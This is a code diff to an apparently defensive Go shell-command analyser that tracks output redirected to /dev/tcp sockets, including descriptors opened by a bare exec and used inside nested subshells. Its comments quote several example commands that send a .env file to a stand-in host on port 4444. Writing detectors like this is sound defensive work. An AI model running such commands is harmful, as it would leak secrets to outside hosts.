@@ -34,16 +34,16 @@ const (
 // itself goes where the compound statement around it sends it (`{ cat .env; } >
 // /dev/tcp/host/4444`), or else where a bare exec of its shell left it (`exec
 // >/dev/tcp/host/4444; cat .env`): its output when it is the last stage of its pipeline, its
-// input when it is the first. A descriptor opened inside a substitution or a subshell is not
-// followed out of it, and neither is one whose number is not written as a number.
+// input when it is the first. What an exec leaves open is open to the commands after it in its
+// subshell or substitution, and in the subshells, substitutions and scripts inside that
+// (`(exec 3>/dev/tcp/host/4444; (cat .env >&3))`), and not after the subshell or substitution
+// ends; a descriptor whose number is not written as a number is not followed.
 func SocketRedirects(commands []Command) [][]SocketRedirect {
 	var out [][]SocketRedirect
-	// open maps a descriptor an exec left open on a socket, in the shell that ran the exec, to
-	// the pseudo-file.
-	var open map[descriptorKey]string
+	// open are the descriptors bare execs redirected, in the order they ran.
+	var open []openDescriptor
 	for i := range commands {
 		c := &commands[i]
-		scope := descriptorKey{shell: c.shell, within: c.within, subshell: c.subshell}
 		// Only a bare exec's redirections outlast the command.
 		keeps := len(c.Argv) == 1 && c.Argv[0].Known && c.Argv[0].Text == "exec"
 		for _, r := range c.Redirects {
@@ -61,34 +61,16 @@ func SocketRedirects(commands []Command) [][]SocketRedirect {
 			default:
 				continue // a here-document or a here-string
 			}
-			own := scope
-			own.fd = descriptor(r)
 			target := r.Target.Unquoted
 			if number, isNumber := descriptorNumber(target); (r.Op == ">&" || r.Op == "<&") && (isNumber || target == "-") {
-				// A duplicated descriptor is the socket an exec opened it on: in this shell, or in
-				// one it was started from (a subshell or a substitution from its shell, a script
-				// from the shell that runs it).
-				from := scope
-				from.fd = number
-				found.Path = open[from]
-				for shell := c.shell; found.Path == ""; shell = commands[shell-1].shell {
-					found.Path = open[descriptorKey{shell: shell, fd: number}]
-					if shell == 0 {
-						break
-					}
-				}
+				// A duplicated descriptor is the socket an exec opened it on.
+				found.Path = openOn(commands, open, i, number)
 			} else if isSocketPath(target) {
 				found.Path = target
 			}
 			if keeps {
-				if found.Path == "" {
-					delete(open, own) // closed, or it now names something else
-				} else {
-					if open == nil {
-						open = map[descriptorKey]string{}
-					}
-					open[own] = found.Path
-				}
+				// An empty path closes the descriptor, or says it now names something else.
+				open = append(open, openDescriptor{shell: c.shell, fd: descriptor(r), from: c.Offset, to: c.execEnd, path: found.Path})
 			}
 			if found.Path == "" {
 				continue
@@ -111,15 +93,7 @@ func SocketRedirects(commands []Command) [][]SocketRedirect {
 			path, decided := compoundSocket(commands, i, std.fd)
 			// What a substitution's commands write is the substitution's value, not the stream.
 			if !decided && (std.fd == "1" && c.within == 0 && isLastStage(commands, i) || std.fd == "0" && c.Stage == 0) {
-				from := scope
-				from.fd = std.fd
-				path = open[from]
-				for shell := c.shell; path == ""; shell = commands[shell-1].shell {
-					path = open[descriptorKey{shell: shell, fd: std.fd}]
-					if shell == 0 {
-						break
-					}
-				}
+				path = openOn(commands, open, i, std.fd)
 			}
 			if path == "" {
 				continue
@@ -131,6 +105,39 @@ func SocketRedirects(commands []Command) [][]SocketRedirect {
 		}
 	}
 	return out
+}
+
+// openDescriptor is a descriptor a bare exec redirected: in the shell that ran it (shell, as
+// Command.shell), from the exec's offset to the end of its subshell or substitution (to, 0 for
+// none), on the network pseudo-file path, or on no socket when path is empty.
+type openDescriptor struct {
+	shell    int32
+	fd       string
+	from, to int
+	path     string
+}
+
+// openOn returns the socket descriptor fd is open on for command i, as the execs before it left
+// it: the last one that redirected fd where i runs, in i's own shell, or else in the shell that
+// started it, and so on out to the command line. In a shell that started i's, i runs where that
+// shell's command (the bash -c of the script i is in) does.
+func openOn(commands []Command, open []openDescriptor, i int, fd string) string {
+	if len(open) == 0 {
+		return ""
+	}
+	shell, at := commands[i].shell, commands[i].Offset
+	for {
+		for k := len(open) - 1; k >= 0; k-- {
+			if o := &open[k]; o.shell == shell && o.fd == fd && o.from < at && (o.to == 0 || at < o.to) {
+				return o.path
+			}
+		}
+		if shell == 0 {
+			return ""
+		}
+		runner := &commands[shell-1]
+		shell, at = runner.shell, runner.Offset
+	}
 }
 
 // redirectsDescriptor reports whether c redirects descriptor fd itself.
@@ -176,13 +183,6 @@ func isLastStage(commands []Command, i int) bool {
 		}
 	}
 	return true
-}
-
-// descriptorKey is a descriptor of one shell: the command line's own or a script's (shell, as
-// Command.shell), or a substitution's or a subshell's in it.
-type descriptorKey struct {
-	shell, within, subshell int32
-	fd                      string
 }
 
 // descriptorNumber reads the target of >& or <& as a descriptor: digits, with the - that moves it.
